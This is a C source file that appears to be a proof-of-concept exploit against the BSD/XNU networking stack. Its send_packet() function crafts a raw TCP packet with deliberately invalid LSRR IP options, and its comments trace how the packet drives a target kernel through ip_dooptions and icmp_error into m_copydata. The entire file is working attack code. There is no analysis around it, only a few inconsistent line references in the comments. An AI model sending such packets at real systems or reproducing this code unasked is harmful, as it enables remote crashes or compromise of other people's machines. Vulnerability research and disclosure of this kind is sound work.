#include "send_packet.h"

// Create and send a TCP packet, which triggers the following callpath:
//
// 1. ip_input()                bsd/netinet/ip_input.c:1835
// 2. call to ip_dooptions()    bsd/netinet/ip_input.c:2185
// 3. ip_dooptions()            bsd/netinet/ip_input.c:3222
// 4. goto bad                  bsd/netinet/ip_input.c:3250
// 5. call icmp_error           bsd/netinet/ip_input.c:3495
// 6. icmp_error()              bsd/netinet/ip_icmp.c:203
// 7. call m_copydata()         bsd/netinet/ip_icmp.c:339
//
int send_packet(
  const int sock,
  const uint32_t src, const uint16_t src_port,  // In network byte order
  const uint32_t dst, const uint16_t dst_port,  // In network byte order
  const uint32_t seq, const uint32_t ack_seq,
  const uint16_t syn, const uint16_t ack
) {
  char packet[1024];
  memset(packet, 0, sizeof(packet));

  struct iphdr* ip_hdr = (struct iphdr*)packet;
  const size_t ip_hdrlen = 60; // Maximum IP header size.
  struct tcphdr* tcp_hdr = (struct tcphdr*)(ip_hdrlen + (char*)ip_hdr);
  const size_t tcp_hdrlen = 60; // Maximum TCP header size.
  const char* payload = tcp_hdrlen + (char*)tcp_hdr;
  const size_t payload_len = &packet[sizeof(packet)] - payload;

  // Fill in the IP Header
  memset(ip_hdr, 0, ip_hdrlen);
  ip_hdr->ihl = ip_hdrlen >> 2;
  ip_hdr->version = 4;
  ip_hdr->tos = 0;
  ip_hdr->tot_len = ip_hdrlen + tcp_hdrlen + payload_len;
  ip_hdr->id = htonl (54321);  // Id of this packet
  ip_hdr->frag_off = 0;
  ip_hdr->ttl = 255;
  ip_hdr->protocol = IPPROTO_TCP;
  ip_hdr->check = 0; // Checksum will be computed later.
  ip_hdr->saddr = src;
  ip_hdr->daddr = dst;

  unsigned char* ip_opt = sizeof(struct iphdr) + (unsigned char*)ip_hdr;
  size_t ip_optlen = ip_hdrlen - sizeof(struct iphdr);
  memset(ip_opt, IPOPT_NOP, ip_optlen);
  // This assignment makes the options invalid, which will
  // trigger the call to icmp_error() at bsd/netinet/ip_input.c:3495
  ip_opt[ip_optlen-1] = IPOPT_EOL;
  ip_opt[0] = IPOPT_LSRR;
  ip_opt[1] = 3;
  ip_opt[2] = 0; // Invalid: triggers "goto bad" at ip_input.c:3281

  // TCP Header
  memset(tcp_hdr, 0, tcp_hdrlen);
  tcp_hdr->source = src_port;
  tcp_hdr->dest = dst_port;
  tcp_hdr->seq = seq;
  tcp_hdr->ack_seq = ack_seq;
  tcp_hdr->doff = tcp_hdrlen >> 2;
  tcp_hdr->fin = 0;
  tcp_hdr->syn = syn;
  tcp_hdr->rst = 0;
  tcp_hdr->psh = 0;
  tcp_hdr->ack = ack;
  tcp_hdr->urg = 0;
  tcp_hdr->window = htons (5840); // maximum allowed window size
  tcp_hdr->check = 0; // Checksum will be computed later
  tcp_hdr->urg_ptr = 0;

  // Compute checksums.
  tcp_checksum(
    ip_hdr,
    ip_hdrlen,
    tcp_hdr,
    tcp_hdrlen,
    payload,
    payload_len
  );

  // Send the packet
  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = dst_port;
  sin.sin_addr.s_addr = dst;

  const int r0 =
    sendto(
      sock, packet, ip_hdr->tot_len, 0,
      (struct sockaddr *)&sin, sizeof(sin)
    );
  if (r0 < 0) {
    const int err = errno;
    printf("send failed %d err=%d %s\n", r0, err, strerror(err));
    return -1;
  }

  return 0;
}
